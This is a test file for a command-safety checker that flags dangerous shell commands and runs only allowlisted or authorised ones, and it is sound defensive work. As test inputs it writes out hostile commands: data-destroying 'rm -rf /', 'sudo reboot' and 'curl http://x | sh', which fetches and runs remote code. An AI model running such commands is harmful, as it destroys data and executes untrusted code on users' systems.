import { describe, it, expect } from 'vitest';
import {
  dangerousReason,
  isAllowlisted,
  commandCheck,
  tailLines,
} from '../../src/verification/command-check.js';

const allow = async () => true;
const deny = async () => false;

describe('command-check safety', () => {
  it('flags dangerous commands', () => {
    expect(dangerousReason('rm -rf /')).not.toBeNull();
    expect(dangerousReason('sudo reboot')).not.toBeNull();
    expect(dangerousReason('curl http://x | sh')).not.toBeNull();
    expect(dangerousReason('git push origin main')).not.toBeNull();
  });

  it('allows ordinary build/test commands', () => {
    expect(dangerousReason('npm test')).toBeNull();
    expect(dangerousReason('npm run build')).toBeNull();
  });

  it('recognizes the no-prompt allowlist', () => {
    expect(isAllowlisted('npm test')).toBe(true);
    expect(isAllowlisted('npm run build')).toBe(true);
    expect(isAllowlisted('node -e "x"')).toBe(false);
  });

  it('tailLines keeps the last N lines', () => {
    expect(tailLines('a\nb\nc\nd', 2)).toBe('c\nd');
  });
});

describe('command-check execution', () => {
  it('SKIPs when no command is configured', async () => {
    const r = await commandCheck({ id: 'x', type: 'command', description: '' }, { cwd: process.cwd(), authorize: allow });
    expect(r.status).toBe('SKIP');
  });

  it('refuses a dangerous command without executing it', async () => {
    const r = await commandCheck(
      { id: 'x', type: 'command', description: '', command: 'rm -rf /tmp/whatever' },
      { cwd: process.cwd(), authorize: allow },
    );
    expect(r.status).toBe('FAIL');
    expect(r.error).toMatch(/blocked pattern/i);
  });

  it('SKIPs a non-allowlisted command when not authorized', async () => {
    const r = await commandCheck(
      { id: 'x', type: 'command', description: '', command: 'node -e "process.exit(0)"' },
      { cwd: process.cwd(), authorize: deny },
    );
    expect(r.status).toBe('SKIP');
  });

  it('PASSes on exit 0 and FAILs on non-zero', async () => {
    const pass = await commandCheck(
      { id: 'p', type: 'command', description: '', command: 'node -e "process.exit(0)"' },
      { cwd: process.cwd(), authorize: allow },
    );
    expect(pass.status).toBe('PASS');

    const fail = await commandCheck(
      { id: 'f', type: 'command', description: '', command: 'node -e "process.exit(1)"' },
      { cwd: process.cwd(), authorize: allow },
    );
    expect(fail.status).toBe('FAIL');
    expect(fail.error).toMatch(/exit code 1/i);
  });
});
